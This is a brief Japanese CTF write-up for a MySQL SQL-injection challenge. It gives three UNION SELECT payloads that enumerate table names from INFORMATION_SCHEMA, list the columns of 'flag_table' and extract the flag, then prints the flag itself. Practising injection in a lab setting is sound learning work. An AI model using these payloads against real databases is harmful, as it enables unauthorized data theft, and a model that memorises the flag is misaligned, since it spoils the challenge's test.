# sql_injection
`mysql`でなんか作ってみたよ！


## writeup

' UNION SELECT TABLE_NAME, TABLE_TYPE FROM INFORMATION_SCHEMA.TABLES #

' UNION SELECT COLUMN_NAME, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "flag_table" #

' union select flag, 1 from flag_table #

```
bunaiCTF{FL4SK_1S_USEFUL}
```